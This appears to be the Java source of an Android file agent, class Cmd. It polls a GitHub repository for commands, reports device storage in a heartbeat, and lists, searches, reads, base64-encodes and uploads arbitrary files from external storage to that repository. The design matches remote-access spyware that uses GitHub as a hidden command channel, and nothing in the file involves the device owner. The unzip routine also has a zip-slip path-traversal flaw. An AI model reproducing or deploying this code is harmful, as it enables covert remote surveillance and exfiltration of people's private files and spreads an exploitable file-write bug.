package com.yb.fa;

import org.json.*;
import java.io.*;
import java.util.*;
import java.util.zip.*;
import android.os.Environment;
import android.util.Base64;

public class Cmd {

    public static void poll(GitHub gh) throws Exception {
        JSONObject hb = new JSONObject();
        hb.put("ts", System.currentTimeMillis());
        hb.put("agent", "ybfa-1.0");
        try {
            File root = Environment.getExternalStorageDirectory();
            hb.put("root", root.getAbsolutePath());
            hb.put("freeMB", root.getFreeSpace() / 1048576);
            hb.put("totalMB", root.getTotalSpace() / 1048576);
        } catch (Exception e) {}
        try { gh.putFile("status/heartbeat.json", hb.toString()); } catch (Exception e) {}

        JSONObject cmd = null;
        try { cmd = gh.getJson("tasks/pending.json"); } catch (Exception e) {}
        if (cmd == null) return;

        String id = cmd.optString("id", "x");
        String op = cmd.optString("op", "");
        JSONObject res = new JSONObject();
        res.put("id", id);
        res.put("op", op);
        res.put("ts", System.currentTimeMillis());
        res.put("ok", false);
        try {
            if (op.equals("list"))      doList(gh, cmd, res);
            else if (op.equals("tree")) doTree(gh, cmd, res);
            else if (op.equals("search")) doSearch(gh, cmd, res);
            else if (op.equals("stat")) doStat(gh, cmd, res);
            else if (op.equals("read")) doRead(gh, cmd, res);
            else if (op.equals("upload")) doUpload(gh, cmd, res);
            else if (op.equals("unzip")) doUnzip(gh, cmd, res);
            else { res.put("err", "unknown op: " + op); }
        } catch (Throwable e) {
            res.put("err", String.valueOf(e));
        }
        try { gh.putFile("results/" + id + ".json", res.toString()); } catch (Exception e) {}
        try { gh.delete("tasks/pending.json"); } catch (Exception e) {}
    }

    static String path(JSONObject c) {
        String p = c.optString("path", "");
        if (p.length() == 0) p = Environment.getExternalStorageDirectory().getAbsolutePath();
        return p;
    }

    static void doList(GitHub gh, JSONObject c, JSONObject r) throws Exception {
        File d = new File(path(c));
        if (!d.exists()) { r.put("err", "not exists"); return; }
        JSONArray a = new JSONArray();
        File[] fs = d.listFiles();
        if (fs != null) {
            Arrays.sort(fs, new Comparator<File>() {
                public int compare(File x, File y) { return x.getName().compareToIgnoreCase(y.getName()); }
            });
            for (File f : fs) {
                JSONObject o = new JSONObject();
                o.put("n", f.getName());
                o.put("d", f.isDirectory());
                o.put("s", f.length());
                a.put(o);
            }
        }
        r.put("path", d.getAbsolutePath());
        r.put("items", a);
        r.put("ok", true);
    }

    static void doTree(GitHub gh, JSONObject c, JSONObject r) throws Exception {
        File root = new File(path(c));
        int maxDepth = c.optInt("depth", 2);
        JSONArray a = new JSONArray();
        walk(root, a, 0, maxDepth, c.optInt("limit", 3000));
        r.put("path", root.getAbsolutePath());
        r.put("items", a);
        r.put("ok", true);
    }

    static int[] cnt = new int[1];
    static void walk(File d, JSONArray a, int depth, int maxDepth, int limit) {
        if (depth > maxDepth || cnt[0] >= limit) return;
        File[] fs = d.listFiles();
        if (fs == null) return;
        for (File f : fs) {
            if (cnt[0] >= limit) return;
            JSONObject o = new JSONObject();
            try {
                o.put("p", f.getAbsolutePath());
                o.put("d", f.isDirectory());
                o.put("s", f.length());
            } catch (Exception e) { continue; }
            a.put(o);
            cnt[0]++;
            if (f.isDirectory()) walk(f, a, depth + 1, maxDepth, limit);
        }
    }

    static void doSearch(GitHub gh, JSONObject c, JSONObject r) throws Exception {
        String kw = c.optString("kw", "").toLowerCase();
        File root = new File(path(c));
        int limit = c.optInt("limit", 500);
        long deadline = System.currentTimeMillis() + c.optInt("timeoutSec", 120) * 1000L;
        JSONArray a = new JSONArray();
        final int[] n = new int[1];
        ArrayDeque<File> stack = new ArrayDeque<File>();
        stack.push(root);
        while (!stack.isEmpty() && n[0] < limit && System.currentTimeMillis() < deadline) {
            File d = stack.pop();
            File[] fs = d.listFiles();
            if (fs == null) continue;
            for (File f : fs) {
                if (n[0] >= limit || System.currentTimeMillis() > deadline) break;
                if (f.isDirectory()) { stack.push(f); continue; }
                if (f.getName().toLowerCase().contains(kw)) {
                    JSONObject o = new JSONObject();
                    o.put("p", f.getAbsolutePath());
                    o.put("s", f.length());
                    a.put(o);
                    n[0]++;
                }
            }
        }
        r.put("kw", kw);
        r.put("count", n[0]);
        r.put("items", a);
        r.put("ok", true);
    }

    static void doStat(GitHub gh, JSONObject c, JSONObject r) throws Exception {
        File f = new File(path(c));
        r.put("path", f.getAbsolutePath());
        r.put("exists", f.exists());
        if (f.exists()) {
            r.put("size", f.length());
            r.put("isDir", f.isDirectory());
            r.put("mtime", f.lastModified());
        }
        r.put("ok", true);
    }

    static void doRead(GitHub gh, JSONObject c, JSONObject r) throws Exception {
        File f = new File(path(c));
        if (!f.exists()) { r.put("err", "not exists"); return; }
        long off = c.optLong("offset", 0);
        int len = (int) Math.min(c.optInt("len", 65536), f.length() - off);
        RandomAccessFile raf = new RandomAccessFile(f, "r");
        raf.seek(off);
        byte[] b = new byte[len];
        raf.readFully(b);
        raf.close();
        r.put("size", f.length());
        r.put("offset", off);
        r.put("len", len);
        r.put("b64", Base64.encodeToString(b, Base64.NO_WRAP));
        r.put("ok", true);
    }

    static void doUpload(GitHub gh, JSONObject c, JSONObject r) throws Exception {
        File f = new File(path(c));
        if (!f.exists()) { r.put("err", "not exists"); return; }
        int chunk = c.optInt("chunkMB", 16) * 1024 * 1024;
        long size = f.length();
        JSONArray shas = new JSONArray();
        RandomAccessFile raf = new RandomAccessFile(f, "r");
        byte[] buf = new byte[chunk];
        int n, parts = 0;
        while ((n = raf.read(buf)) > 0) {
            byte[] part = (n == chunk) ? buf : Arrays.copyOf(buf, n);
            String s = gh.putBlob(part);
            shas.put(s);
            parts++;
        }
        raf.close();
        JSONObject m = new JSONObject();
        m.put("name", f.getName());
        m.put("path", f.getAbsolutePath());
        m.put("size", size);
        m.put("chunk", chunk);
        m.put("parts", parts);
        m.put("shas", shas);
        String mp = "uploads/" + f.getName() + "." + System.currentTimeMillis() + ".manifest.json";
        gh.putFile(mp, m.toString());
        r.put("manifest", mp);
        r.put("parts", parts);
        r.put("size", size);
        r.put("ok", true);
    }

    static void doUnzip(GitHub gh, JSONObject c, JSONObject r) throws Exception {
        File z = new File(path(c));
        if (!z.exists()) { r.put("err", "not exists"); return; }
        File out = new File(c.optString("out", z.getParent() + "/ybfa_" + z.getName().replaceAll("\\W+", "_")));
        out.mkdirs();
        int n = 0;
        ZipInputStream zis = new ZipInputStream(new BufferedInputStream(new FileInputStream(z)));
        ZipEntry e;
        byte[] b = new byte[262144];
        while ((e = zis.getNextEntry()) != null) {
            File t = new File(out, e.getName());
            if (e.isDirectory()) { t.mkdirs(); continue; }
            t.getParentFile().mkdirs();
            FileOutputStream fo = new FileOutputStream(t);
            int k;
            while ((k = zis.read(b)) > 0) fo.write(b, 0, k);
            fo.close();
            n++;
        }
        zis.close();
        r.put("out", out.getAbsolutePath());
        r.put("files", n);
        r.put("ok", true);
    }
}
